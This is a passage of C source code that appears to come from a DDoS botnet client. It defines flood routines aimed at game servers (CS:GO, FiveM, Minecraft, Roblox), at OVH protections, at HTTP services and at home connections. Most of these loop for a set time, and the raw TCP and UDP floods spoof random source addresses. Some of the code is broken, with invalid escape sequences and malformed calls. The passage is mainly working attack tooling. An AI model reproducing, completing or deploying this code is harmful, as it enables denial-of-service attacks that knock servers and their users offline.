        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void makeVSEPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	char *vse_payload;
        int vse_payload_len;
	vse_payload = "TSource Engine Query", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int socket_connect(char *host, in_port_t port) {

	struct hostent *hp;

	struct sockaddr_in addr;

	int on = 1, sock;     

	if ((hp = gethostbyname(host)) == NULL) return 0;

	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);

	addr.sin_port = htons(port);

	addr.sin_family = AF_INET;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

	if (sock == -1) return 0;

	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;

	return sock;

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//  /$$$$$$                                          /$$      /$$             /$$     /$$                       /$$          //
// /$$__  $$                                        | $$$    /$$$            | $$    | $$                      | $$          //
//| $$  \__/  /$$$$$$  /$$$$$$/$$$$   /$$$$$$       | $$$$  /$$$$  /$$$$$$  /$$$$$$  | $$$$$$$   /$$$$$$   /$$$$$$$  /$$$$$$$//
//| $$ /$$$$ |____  $$| $$_  $$_  $$ /$$__  $$      | $$ $$/$$ $$ /$$__  $$|_  $$_/  | $$__  $$ /$$__  $$ /$$__  $$ /$$_____///
//| $$|_  $$  /$$$$$$$| $$ \ $$ \ $$| $$$$$$$$      | $$  $$$| $$| $$$$$$$$  | $$    | $$  \ $$| $$  \ $$| $$  | $$|  $$$$$$ //
//| $$  \ $$ /$$__  $$| $$ | $$ | $$| $$_____/      | $$\  $ | $$| $$_____/  | $$ /$$| $$  | $$| $$  | $$| $$  | $$ \____  $$//
//|  $$$$$$/|  $$$$$$$| $$ | $$ | $$|  $$$$$$$      | $$ \/  | $$|  $$$$$$$  |  $$$$/| $$  | $$|  $$$$$$/|  $$$$$$$ /$$$$$$$///
// \______/  \_______/|__/ |__/ |__/ \_______/      |__/     |__/ \_______/   \___/  |__/  |__/ \______/  \_______/|_______/ //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////                                                                                                                           
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void sendCSGO(const char* dst_ip, int port, int duration) {
    // initialize packet buffer
    char pkt[CSGO_PKT_LEN];
    memset(pkt, 0, CSGO_PKT_LEN);

    // set IP header fields
    struct iphdr *ip_hdr = (struct iphdr *) pkt;
    ip_hdr->ihl = 5;
    ip_hdr->version = 4;
    ip_hdr->tos = 0;
    ip_hdr->tot_len = htons(CSGO_PKT_LEN);
    ip_hdr->id = htons(54321);
    ip_hdr->frag_off = htons(16384);
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_UDP;
    ip_hdr->check = 0;
    ip_hdr->saddr = inet_addr(CSGO_SRC_IP);
    ip_hdr->daddr = inet_addr(dst_ip);

    // set UDP header fields
    struct udphdr *udp_hdr = (struct udphdr *) (pkt + CSGO_IP_HDR_LEN);
    udp_hdr->source = htons(CSGO_SRC_PORT);
    udp_hdr->dest = htons(port);
    udp_hdr->len = htons(CSGO_PKT_LEN - CSGO_IP_HDR_LEN);
    udp_hdr->check = 0;

    // send packet to server for the specified duration
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(dst_ip);

    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < duration) {
        sendto(sock, pkt, CSGO_PKT_LEN, 0, (struct sockaddr *) &sin, sizeof(sin));
    }
}

void sendFiveM(unsigned char *target, int port, int secs) {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[1024] = "GET / HTTP/1.1\r\n";

    // create a socket
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket error");
        exit(EXIT_FAILURE);
    }

    // set up the server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(target);

    // connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect error");
        exit(EXIT_FAILURE);
    }

    time_t start_time = time(NULL);

    // send the attack packet repeatedly
    while (time(NULL) - start_time < secs) {
        if (send(sockfd, buffer, strlen(buffer), 0) < 0) {
            perror("send error");
            exit(EXIT_FAILURE);
        }
    }

    close(sockfd);
}

void sendMinecraft(unsigned char *target, int port, int secs) {
    // Convert IP address string to binary format
    struct in_addr addr;
    if (inet_pton(AF_INET, target, &addr) != 1) {
        perror("inet_pton");
        exit(1);
    }

    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket");
        exit(1);
    }

    // Set socket to non-blocking mode
    if (fcntl(sockfd, F_SETFL, O_NONBLOCK) == -1) {
        perror("fcntl");
        exit(1);
    }

    // Connect to the server
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr = addr;
    server_addr.sin_port = htons(port);
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1 && errno != EINPROGRESS) {
        perror("connect");
        exit(1);
    }

    // Get the current time
    time_t start_time = time(NULL);

    // Send packets until the specified duration has passed
    while (time(NULL) - start_time < secs) {
        // Construct the Minecraft packet
        struct MinecraftPacket packet;
        packet.id = 0x00;
        // Fill in the packet data with your desired payload
        packet.length = snprintf(packet.data, PACKET_SIZE-2, "Hello, server!");

        // Send the packet to the server
        int bytes_sent = send(sockfd, &packet, packet.length+2, MSG_DONTWAIT);
        if (bytes_sent == -1) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                // Socket is not ready for sending, try again later
                continue;
            } else {
                // Error occurred while sending, exit
                perror("send");
                exit(1);
            }
        }
    }

    // Close the socket
    close(sockfd);
}

void sendROBLOX(unsigned char *target, int port, int secs) {
    // Convert IP address string to binary format
    struct in_addr addr;
    if (inet_pton(AF_INET, target, &addr) != 1) {
        perror("inet_pton");
        exit(1);
    }

    // Create a socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("socket");
        exit(1);
    }

    // Set the socket to non-blocking mode
    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        exit(1);
    }
    if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) == -1) {
        perror("fcntl");
        exit(1);
    }

    // Connect to the server
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr = addr;
    server_addr.sin_port = htons(port);
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1 && errno != EINPROGRESS) {
        perror("connect");
        exit(1);
    }

    // Get the current time
    time_t start_time = time(NULL);

    // Send packets until the specified duration has passed
    while (time(NULL) - start_time < secs) {
        // Construct the Roblox packet
        struct RobloxPacket packet;
        packet.packetLength = sizeof(packet.data);
        // Fill in the packet data with your desired payload

        // Send the packet to the server
        ssize_t bytes_sent = send(sockfd, &packet, sizeof(packet), 0);
        if (bytes_sent == -1 && errno != EAGAIN) {
            perror("send");
            exit(1);
        } else if (bytes_sent > 0) {
            printf("Sent packet of size %ld\n", bytes_sent);
        }
    }

    // Close the socket
    close(sockfd);
}

////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////
//  /$$$$$$$  /$$     /$$ /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  //
// | $$__  $$|  $$   /$$/| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ //
// | $$  \ $$ \  $$ /$$/ | $$  \ $$| $$  \ $$| $$  \__/| $$  \__/ //
// | $$$$$$$   \  $$$$/  | $$$$$$$/| $$$$$$$$|  $$$$$$ |  $$$$$$  //
// | $$__  $$   \  $$/   | $$____/ | $$__  $$ \____  $$ \____  $$ //
// | $$  \ $$    | $$    | $$      | $$  | $$ /$$  \ $$ /$$  \ $$ //
// | $$$$$$$/    | $$    | $$      | $$  | $$|  $$$$$$/|  $$$$$$/ //
// |_______/     |__/    |__/      |__/  |__/ \______/  \______/  //
////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////

void sendZAP(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;

    while(1)
    {
        char *rhexstring[] = {
                "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
                "\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void sendOVH(unsigned char *ip, int port, int secs)
    {
    int std_hex;

    std_hex = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(ip);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;

    unsigned int a = 0;

    while(1)
    {
        char *rhexstring[] = {
                "\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
                "\x8r\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void sendOVHL7(char *host, in_port_t port, int timeEnd, int power) {
    int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512], buffer[1], pgetData[2048];
    sprintf(pgetData, "\x00","\x01","\x02",
    "\x03","\x04","\x05","\x06","\x07","\x08","\x09",
    "\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10",
    "\x11","\x12","\x13","\x14","\x15","\x16","\x17",
    "\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e",
    "\x1f","\x20","\x21","\x22","\x23","\x24","\x25",
    "\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c",
    "\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33",
    "\x34","\x35","\x36","\x37","\x38","\x39","\x3a",
    "\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41",
    "\x42","\x43","\x44","\x45","\x46","\x47","\x48",
    "\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",
    "\x50","\x51","\x52","\x53","\x54","\x55","\x56",
    "\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d",
    "\x5e","\x5f","\x60","\x61","\x62","\x63","\x64",
    "\x65","\x66","\x67","\x68","\x69","\x6a","\x6b",
    "\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72",
    "\x73","\x74","\x75","\x76","\x77","\x78","\x79",
    "\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80",
    "\x81","\x82","\x83","\x84","\x85","\x86","\x87",
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",
    "\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1",
    "\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8",
    "\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",
    "\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6",
    "\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd",
    "\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4",
    "\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb",
    "\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2",
    "\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9",
    "\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
    "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7",
    "\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
    for (i = 0; i < power; i++) {
        sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 2)]);
        if (fork()) {
            while (end > time(NULL)) {
                socket = socket_connect(host, port);
                if (socket != 0) {
                    write(socket, request, strlen(request));
                    read(socket, buffer, 1);
                    close(socket);
                }
            }
           exit(0);
       }
    }
}

//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////
//  /$$        /$$$$$$  /$$     /$$ /$$$$$$$$ /$$$$$$$        /$$$$$$$$ //
// | $$       /$$__  $$|  $$   /$$/| $$_____/| $$__  $$      |_____ $$/ //
// | $$      | $$  \ $$ \  $$ /$$/ | $$      | $$  \ $$           /$$/  //
// | $$      | $$$$$$$$  \  $$$$/  | $$$$$   | $$$$$$$/          /$$/   //
// | $$      | $$__  $$   \  $$/   | $$__/   | $$__  $$         /$$/    //
// | $$      | $$  | $$    | $$    | $$      | $$  \ $$        /$$/     //
// | $$$$$$$$| $$  | $$    | $$    | $$$$$$$$| $$  | $$       /$$/      //
// |________/|__/  |__/    |__/    |________/|__/  |__/      |__/       //
//////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////

void sendHTTP(char *host, in_port_t port, int timeEnd) {

	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;

	char request[512], buffer[1];

	for (i = 0; i < 1000; i++) {

		sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", host, useragents[(rand() % 36)]);

		if (fork()) {

			while (end > time(NULL)) {

				socket = socket_connect(host, port);

				if (socket != 0) {

					write(socket, request, strlen(request));

					read(socket, buffer, 1);

					close(socket);

				}

			}

			exit(0);

		}

	}

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//  /$$   /$$  /$$$$$$  /$$      /$$ /$$$$$$$$       /$$      /$$ /$$$$$$$$ /$$$$$$$$ /$$   /$$  /$$$$$$  /$$$$$$$   /$$$$$$  //
// | $$  | $$ /$$__  $$| $$$    /$$$| $$_____/      | $$$    /$$$| $$_____/|__  $$__/| $$  | $$ /$$__  $$| $$__  $$ /$$__  $$ //
// | $$  | $$| $$  \ $$| $$$$  /$$$$| $$            | $$$$  /$$$$| $$         | $$   | $$  | $$| $$  \ $$| $$  \ $$| $$  \__/ //
// | $$$$$$$$| $$  | $$| $$ $$/$$ $$| $$$$$         | $$ $$/$$ $$| $$$$$      | $$   | $$$$$$$$| $$  | $$| $$  | $$|  $$$$$$  //
// | $$__  $$| $$  | $$| $$  $$$| $$| $$__/         | $$  $$$| $$| $$__/      | $$   | $$__  $$| $$  | $$| $$  | $$ \____  $$ //
// | $$  | $$| $$  | $$| $$\  $ | $$| $$            | $$\  $ | $$| $$         | $$   | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$ //
// | $$  | $$|  $$$$$$/| $$ \/  | $$| $$$$$$$$      | $$ \/  | $$| $$$$$$$$   | $$   | $$  | $$|  $$$$$$/| $$$$$$$/|  $$$$$$/ //
// |__/  |__/ \______/ |__/     |__/|________/      |__/     |__/|________/   |__/   |__/  |__/ \______/ |_______/  \______/  //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void sendNTPAMP(unsigned char *ip, int port, int secs) 
{
    int sockfd;
    char buffer[NTP_PACKET_SIZE];
    struct sockaddr_in server_addr;

    // create socket
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) 
    {
        perror("socket creation failed");
        return 1;
    }

    // set server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) 
    {
        perror("invalid server address");
        return 1;
    }

    // set timeout
    struct timeval timeout;
    timeout.tv_sec = NTP_TIMEOUT_SEC;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) 
    {
        perror("setsockopt failed");
        return;
    }

    // initialize packet buffer
    memset(buffer, 0, NTP_PACKET_SIZE);
    buffer[0] = 0x1b;

    // send packets for given duration
    time_t start_time = time(NULL);
    while (time(NULL) < start_time + secs) 
    {
        if (sendto(sockfd, buffer, NTP_PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) 
        {
            perror("sendto failed");
            return;
        }
    }

    // close socket
    close(sockfd);

    return;
}

void sendSTD(unsigned char *ip, int port, int secs) {

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(ip);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;

    unsigned int a = 0;

    while(1){
        if (a >= 50) 
        {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                close(iSTD_Sock);
				_exit(0);
            }
            a = 0;
        }
        a++;
    }
}

void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
	register unsigned int pollRegister;
	pollRegister = pollinterval;

	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(!sockfd)
	{
		return;
	}

	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
	{
		return;
	}

	in_addr_t netmask;

	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );

	unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

	tcph->source = rand_cmwc();
	tcph->seq = rand_cmwc();
	tcph->ack_seq = 0;
	tcph->doff = 5;

	if(!strcmp(flags, "all"))
	{
		tcph->syn = 1;
		tcph->rst = 1;
		tcph->fin = 1;
		tcph->ack = 1;
		tcph->psh = 1;
	} else {
		unsigned char *pch = strtok(flags, ",");
		while(pch)
		{
			if(!strcmp(pch,         "syn"))
			{
				tcph->syn = 1;
			} else if(!strcmp(pch,  "rst"))
			{
				tcph->rst = 1;
			} else if(!strcmp(pch,  "fin"))
			{
				tcph->fin = 1;
			} else if(!strcmp(pch,  "ack"))
			{
				tcph->ack = 1;
			} else if(!strcmp(pch,  "psh"))
			{
				tcph->psh = 1;
			} else {
			}
			pch = strtok(NULL, ",");
		}
	}

	tcph->window = rand_cmwc();
	tcph->check = 0;
	tcph->urg_ptr = 0;
	tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
	tcph->check = tcpcsum(iph, tcph);

	iph->check = csum ((unsigned short *) packet, iph->tot_len);

	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	while(1)
	{
		sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

		iph->saddr = htonl( getRandomIP(netmask) );
		iph->id = rand_cmwc();
		tcph->seq = rand_cmwc();
		tcph->source = rand_cmwc();
		tcph->check = 0;
		tcph->check = tcpcsum(iph, tcph);
		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		if(i == pollRegister)
		{
			if(time(NULL) > end) break;
			i = 0;
			continue;
		}
		i++;
	}
}

void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
	struct sockaddr_in dest_addr;

	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

	register unsigned int pollRegister;
	pollRegister = pollinterval;

	if(spoofit == 32)
	{
		int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(!sockfd)
		{
			return;
		}

		unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
		if(buf == NULL) return;
		memset(buf, 0, packetsize + 1);
		makeRandomStr(buf, packetsize);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while(1)
		{
			sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			if(i == pollRegister)
			{
				if(port == 0) dest_addr.sin_port = rand_cmwc();
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
		}
	} else {
		int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if(!sockfd)
		{
			return;
		}

		int tmp = 1;
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
		{
			return;
		}

		int counter = 50;
		while(counter--)
		{
			srand(time(NULL) ^ rand_cmwc());
			init_rand(rand());
		}

		in_addr_t netmask;

		if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
		else netmask = ( ~((1 << (32 - spoofit)) - 1) );

		unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
		struct iphdr *iph = (struct iphdr *)packet;
		struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

		makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

		udph->len = htons(sizeof(struct udphdr) + packetsize);
		udph->source = rand_cmwc();
		udph->dest = (port == 0 ? rand_cmwc() : htons(port));
		udph->check = 0;

		makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

		iph->check = csum ((unsigned short *) packet, iph->tot_len);

		int end = time(NULL) + timeEnd;
		register unsigned int i = 0;
		while(1)
		{
			sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

			udph->source = rand_cmwc();
			udph->dest = (port == 0 ? rand_cmwc() : htons(port));
			iph->id = rand_cmwc();
			iph->saddr = htonl( getRandomIP(netmask) );
			iph->check = csum ((unsigned short *) packet, iph->tot_len);

			if(i == pollRegister)
			{
				if(time(NULL) > end) break;
				i = 0;
				continue;
			}
			i++;
		}
	}
}

void sendHEX(unsigned char *ip, int port, int secs, int packetsize) 
{
        int std_hex;
        std_hex = socket(AF_INET, SOCK_DGRAM, 0);
        time_t start = time(NULL);
        struct sockaddr_in sin;
        struct hostent *hp;
        hp = gethostbyname(ip);
        bzero((char*) &sin,sizeof(sin));
        bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
        sin.sin_family = hp->h_addrtype;
        sin.sin_port = port;
        unsigned int a = 0;
        while(1)
        {         //change it if u want
                char *hexstring[] = {"\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a"};
                if (a >= 50)
                {
                        send(std_hex, hexstring, packetsize, 0);
                        connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
                        if (time(NULL) >= start + secs)
                        {
                                close(std_hex);
                                _exit(0);
                        }
                        a = 0;
                }
                a++;
        }
}

char *defarchs() {
    #if defined(__x86_64__) || defined(__amd64__) || defined(__amd64) || defined(__x86_64) || defined(_M_X64) || defined(_M_AMD64)
    return "x86_64";
    #elif defined(__X86__) || defined(_X86_) || defined(i386) || defined(__i386__) || defined(__i386) || defined(__i686__) || defined(__i586__) || defined(__i486__)
    return "x86_32";
    #elif defined(__aarch64__) 
    return "64";
    #elif defined (__ARM_ARCH_5__) || defined(__ARM_ARCH_5E__) || defined(__ARM_ARCH_5T__) || defined(__ARM_ARCH_5TE__) || defined(__ARM_ARCH_5TEJ__)
    return "ARM5";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM4";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__ARM_ARCH_6M_) || defined(__ARM_ARCH_6T2__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__) 
    return "ARM7";
    #elif defined(__BIG_ENDIAN__) || defined(__MIPSEB) || defined(__MIPSEB__) || defined(__MIPS__)
